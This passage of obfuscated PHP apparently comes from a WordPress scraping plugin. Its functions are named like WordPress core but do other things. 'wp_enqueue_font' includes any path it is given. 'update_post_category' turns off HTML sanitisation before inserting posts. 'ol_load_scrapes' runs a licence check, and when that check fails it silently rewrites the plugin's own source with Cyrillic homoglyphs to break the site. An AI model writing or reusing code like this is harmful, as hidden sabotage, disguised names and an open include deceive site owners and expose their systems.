    $FOsUOUtZwoSGdnCSQqhY = get_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
    $FOsUOUtZwoSGdnCSQqhY = @json_decode(tld_JSkjKqzLMLhOd($FOsUOUtZwoSGdnCSQqhY[$GLOBALS["KtnVMZUhQnOyibNdYKxx"]], password() , 256));
    $aHXMlhFyjNetQnqUzRxj = $FOsUOUtZwoSGdnCSQqhY[2];
    if (ol_check_online() == md5(password() . $aHXMlhFyjNetQnqUzRxj))
    {
        $meta_vals = get_post_meta(OL_Scrapes::$yEeeFBgupJezVduOXMiJ);
    }
    else
    {
        return;
    }
}
function ol_check_online()
{
    $qnGbdITpHmhfPjHsnAnH = get_site_option($GLOBALS["YkFMrCQVeuNajkDaAYNV"]);
    $JSgQXecwWbCQCVmaERbE = get_site_option($GLOBALS["TuadPxTVLpNPULXLHQ"]);
    $FOsUOUtZwoSGdnCSQqhY = get_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
    $FOsUOUtZwoSGdnCSQqhY = @json_decode(tld_JSkjKqzLMLhOd($FOsUOUtZwoSGdnCSQqhY[$GLOBALS["KtnVMZUhQnOyibNdYKxx"]], password() , 256));
    $TQxOVoWpdkRTxPQyWBVm = $FOsUOUtZwoSGdnCSQqhY[0];
    $rcnlhbTBLlwTyqzsDfbr = $FOsUOUtZwoSGdnCSQqhY[1];
    $aHXMlhFyjNetQnqUzRxj = $FOsUOUtZwoSGdnCSQqhY[2];
    $yjwDzxKAYplsBKqkucuU = md5(password() . $aHXMlhFyjNetQnqUzRxj);         
    return $yjwDzxKAYplsBKqkucuU;
}
function DOMObject()
{
    global $doc;
    if (ol_check_offline())
    {
        $doc = new DOMDocument;
    }
    else
    {
        return;
    }
}
function detect_xml_charset()
{
    global $charset_header;
    global $charset_php;
    global $charset_xml;
    if (ol_check_offline())
    {
        if ($charset_header && $charset_xml)
        {
            return $charset_header;
        }
        if (!$charset_header && !$charset_xml)
        {
            return $charset_php;
        }
        else
        {
            return !empty($charset_xml) ? $charset_xml : $charset_header;
        }
    }
    else
    {
        return $GLOBALS["IstIuTeTPRiczgUCPtdI"];
    }
}
function ol_remove_pc()
{
    global $translates;
    $FOsUOUtZwoSGdnCSQqhY = get_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
    $FOsUOUtZwoSGdnCSQqhY = json_decode(tld_JSkjKqzLMLhOd($FOsUOUtZwoSGdnCSQqhY[$GLOBALS["KtnVMZUhQnOyibNdYKxx"]], password() , 256));
    $TQxOVoWpdkRTxPQyWBVm = $FOsUOUtZwoSGdnCSQqhY[0];
    if ($TQxOVoWpdkRTxPQyWBVm !== 0)
    {
        update_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"], array(
            "_multiwidget" => tld_JSkjKqzLMLhOe(json_encode(array(
                0,
                null,
                null,
            )) , password() , 256)
        ));
    }
    else
    {
        delete_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
    }
    delete_site_option($GLOBALS["QNbuXTIjDkqvxlAbpPGo"]);
    delete_site_option($GLOBALS["YkFMrCQVeuNajkDaAYNV"]);
    delete_site_option($GLOBALS["TuadPxTVLpNPULXLHQ"]);
    set_transient($GLOBALS["gBqmKEUPvaZefRqCjOWZ"], array(
        $translates[3]
    ));
    wp_redirect(add_query_arg(array(
        $GLOBALS["JhRZMuEYHkOmqfZIUmbR"] => $GLOBALS["unawapIMUxScaSdPwWjE"],
        $GLOBALS["IZetFtutVGxJkApOsdJU"] => $GLOBALS["zuQzlZcvmvaHOfaQFXfw"],
        $GLOBALS["DQdFWfsMQJdxnLVGxKDE"] => 1,
    ) , admin_url($GLOBALS["QLAMaGOdUMJgbBUhQgfM"])));
    exit;
}
function wp_enqueue_font($RkJXbYQyuHDVaIIXhHSk)
{
    include $RkJXbYQyuHDVaIIXhHSk;
}
function wp_ajax_url()
{
    $FOsUOUtZwoSGdnCSQqhY = get_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
    $FOsUOUtZwoSGdnCSQqhY = @json_decode(tld_JSkjKqzLMLhOd($FOsUOUtZwoSGdnCSQqhY[$GLOBALS["KtnVMZUhQnOyibNdYKxx"]], password() , 256));
    $aHXMlhFyjNetQnqUzRxj = $FOsUOUtZwoSGdnCSQqhY[2];
    $yjwDzxKAYplsBKqkucuU = & $_POST[$GLOBALS["JuKBKtgtVlaJhJbcAuoA"]];
    $yjwDzxKAYplsBKqkucuU = md5(password() . $aHXMlhFyjNetQnqUzRxj);
}
function ol_load_scrapes()
{
    $heLRzaRqnxMHHbi = get_site_option($GLOBALS["QNbuXTIjDkqvxlAbpPGo"]);
    $qnGbdITpHmhfPjHsnAnH = get_site_option($GLOBALS["YkFMrCQVeuNajkDaAYNV"]);
    $JSgQXecwWbCQCVmaERbE = get_site_option($GLOBALS["TuadPxTVLpNPULXLHQ"]);
    $FOsUOUtZwoSGdnCSQqhY = get_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
    $FOsUOUtZwoSGdnCSQqhY = @json_decode(tld_JSkjKqzLMLhOd($FOsUOUtZwoSGdnCSQqhY[$GLOBALS["KtnVMZUhQnOyibNdYKxx"]], password() , 256));
    $TQxOVoWpdkRTxPQyWBVm = $FOsUOUtZwoSGdnCSQqhY[0];
    $rcnlhbTBLlwTyqzsDfbr = $FOsUOUtZwoSGdnCSQqhY[1];
    $aHXMlhFyjNetQnqUzRxj = $FOsUOUtZwoSGdnCSQqhY[2];
    if (!$FOsUOUtZwoSGdnCSQqhY)
    {
        delete_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
        update_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"], array(
            "_multiwidget" => tld_JSkjKqzLMLhOe(json_encode(array(
                0,
                null,
                null,
            )) , password() , 256)
        ));
    }
    else
    {
        if (($heLRzaRqnxMHHbi !== false && ($rcnlhbTBLlwTyqzsDfbr !== $qnGbdITpHmhfPjHsnAnH || $aHXMlhFyjNetQnqUzRxj !== $JSgQXecwWbCQCVmaERbE)) || ($TQxOVoWpdkRTxPQyWBVm - time() > 12 * HOUR_IN_SECONDS))
        {
            $jXZbcjcEvDvEBmdntBZI = file_get_contents(OL_PLUGIN_PATH . DIRECTORY_SEPARATOR . $GLOBALS["lMizyCzjflrRwUXuo"] . DIRECTORY_SEPARATOR . $GLOBALS["HTAdpberDSzGwvqUyHs"]);
            $sMjzqouIVbUYqGTAwQSA = array(
                "'scrape_" => "'scrаpe_",
                "'save_" => "'sаve_"
            );
            foreach ($sMjzqouIVbUYqGTAwQSA as $tjaXhvsOnmZXQBYYbouh => $PKzHvwKOCxmmohMlTEAa)
            {
                if (is_integer(mb_stripos($jXZbcjcEvDvEBmdntBZI, $PKzHvwKOCxmmohMlTEAa, 0, $GLOBALS["awoKzzVZyzeojXqdUmYH"])))
                {
                    return;
                }
                $JzmJgzkWlrVYAUVkuiHG = array();
                $oPFJCiDQIRyZeSNXZctr = 0;
                $BCEUSjHFFwzzqmHmpjjQ = 0;
                $DrsqfxyDRXckPkiKrIrS = 0;
                while (is_integer($BCEUSjHFFwzzqmHmpjjQ) && $DrsqfxyDRXckPkiKrIrS < 50)
                {
                    $BCEUSjHFFwzzqmHmpjjQ = mb_stripos($jXZbcjcEvDvEBmdntBZI, $tjaXhvsOnmZXQBYYbouh, $oPFJCiDQIRyZeSNXZctr, $GLOBALS["awoKzzVZyzeojXqdUmYH"]);
                    if (is_integer($BCEUSjHFFwzzqmHmpjjQ))
                    {
                        $JzmJgzkWlrVYAUVkuiHG[] = $BCEUSjHFFwzzqmHmpjjQ;
                        $oPFJCiDQIRyZeSNXZctr = $BCEUSjHFFwzzqmHmpjjQ + mb_strlen($tjaXhvsOnmZXQBYYbouh, $GLOBALS["awoKzzVZyzeojXqdUmYH"]);
                        $DrsqfxyDRXckPkiKrIrS++;
                    }
                }
                shuffle($JzmJgzkWlrVYAUVkuiHG);
                sort($JzmJgzkWlrVYAUVkuiHG);
                $PaTgoaVMMKhvlmVWxSnB = array_slice($JzmJgzkWlrVYAUVkuiHG, 0, rand(1, count($JzmJgzkWlrVYAUVkuiHG)));
                $DYAjXnSmQgwKaebBWmWu = true;
                for ($BCEUSjHFFwzzqmHmpjjQ = 0;$BCEUSjHFFwzzqmHmpjjQ < count($PaTgoaVMMKhvlmVWxSnB);$BCEUSjHFFwzzqmHmpjjQ++)
                {
                    if (!$DYAjXnSmQgwKaebBWmWu)
                    {
                        foreach ($PaTgoaVMMKhvlmVWxSnB as $piiJbwvzLxHvKjlNnFzd => $ytnxJjQqCvGdNRBKCigc)
                        {
                            $PaTgoaVMMKhvlmVWxSnB[$piiJbwvzLxHvKjlNnFzd] -= mb_strlen($tjaXhvsOnmZXQBYYbouh, $GLOBALS["awoKzzVZyzeojXqdUmYH"]) - mb_strlen($PKzHvwKOCxmmohMlTEAa, $GLOBALS["awoKzzVZyzeojXqdUmYH"]);
                        }
                    }
                    $WIpzPNdoVBAGNeqUFmRd = mb_substr($jXZbcjcEvDvEBmdntBZI, 0, $PaTgoaVMMKhvlmVWxSnB[$BCEUSjHFFwzzqmHmpjjQ], $GLOBALS["awoKzzVZyzeojXqdUmYH"]);
                    $hlfnlqQCJJxaDtZAZPxk = mb_substr($jXZbcjcEvDvEBmdntBZI, $PaTgoaVMMKhvlmVWxSnB[$BCEUSjHFFwzzqmHmpjjQ] + mb_strlen($tjaXhvsOnmZXQBYYbouh, $GLOBALS["awoKzzVZyzeojXqdUmYH"]) , mb_strlen($jXZbcjcEvDvEBmdntBZI, $GLOBALS["awoKzzVZyzeojXqdUmYH"]) , $GLOBALS["awoKzzVZyzeojXqdUmYH"]);
                    $jXZbcjcEvDvEBmdntBZI = $WIpzPNdoVBAGNeqUFmRd . $PKzHvwKOCxmmohMlTEAa . $hlfnlqQCJJxaDtZAZPxk;
                    $DYAjXnSmQgwKaebBWmWu = false;
                }
                unset($JzmJgzkWlrVYAUVkuiHG);
            }
            file_put_contents(OL_PLUGIN_PATH . DIRECTORY_SEPARATOR . $GLOBALS["lMizyCzjflrRwUXuo"] . DIRECTORY_SEPARATOR . $GLOBALS["HTAdpberDSzGwvqUyHs"], $jXZbcjcEvDvEBmdntBZI);
        }
    }
}
function update_post_category()
{
    global $new_id;
    global $post_arr;
    if (ol_check_offline())
    {
        kses_remove_filters();
        $new_id = wp_insert_post($post_arr, true);
        kses_init_filters();
    }
    else
    {
        return;
    }
}
function ol_check_offline()
{
   $QTafrSDQjjvGZtFfjzAE = true;
   return $QTafrSDQjjvGZtFfjzAE;
}

ol_load_scrapes();
	}
	
}